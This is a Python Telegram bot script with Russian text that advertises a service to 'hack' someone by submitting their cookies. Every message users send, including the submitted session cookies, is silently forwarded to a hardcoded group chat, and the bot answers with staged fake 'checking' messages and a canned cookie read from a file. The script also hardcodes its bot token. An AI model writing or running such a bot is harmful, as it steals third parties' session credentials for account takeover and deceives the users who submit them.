import os
import telebot
import time

TOKEN = "8260437183:AAG2NNbMPhsvkWjkxYaxAjceNm9jward6UA"
GROUP_ID = "-1003396901780"
bot = telebot.TeleBot(TOKEN)

# Функция для чтения куки из файла
def read_cookie_from_file():
    try:
        with open('COOKIE.txt', 'r', encoding='utf-8') as f:
            cookie = f.read().strip()
            print(f"✅ Куки загружено из файла ({len(cookie)} символов)")
            return cookie
    except FileNotFoundError:
        print("❌ Файл COOKIE.txt не найден")
        return None
    except Exception as e:
        print(f"❌ Ошибка чтения файла: {e}")
        return None

# Загружаем куки при запуске бота
COOKIE_TEXT = read_cookie_from_file()

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.send_message(
        message.chat.id, 
        "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪"
    )
    try:
        bot.send_message(GROUP_ID, f"👤 Кто-то нажал /start\nID: {message.from_user.id}")
    except Exception as e:
        print(f"Ошибка отправки в группу: {e}")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    bot.send_message(message.chat.id, "Проверка куки...")
    time.sleep(2)
    bot.send_message(message.chat.id, "Проверка прошла успешно ✅ Идёт инициализация...")
    time.sleep(3)
    
    # Используем куки из файла
    if COOKIE_TEXT:
        final_message = f"Инициализация завершена✅ ваш куки: {COOKIE_TEXT}"
    else:
        final_message = "Инициализация завершена✅ но куки не найдено в файле"
    
    bot.send_message(message.chat.id, final_message)
    
    try:
        bot.send_message(
            GROUP_ID, 
            f"📩 Сообщение от: {message.from_user.first_name}\nТекст: {message.text}"
        )
    except Exception as e:
        print(f"Ошибка отправки в группу: {e}")

print("🚀 Бот запущен и готов к работе!")
bot.polling(none_stop=True)
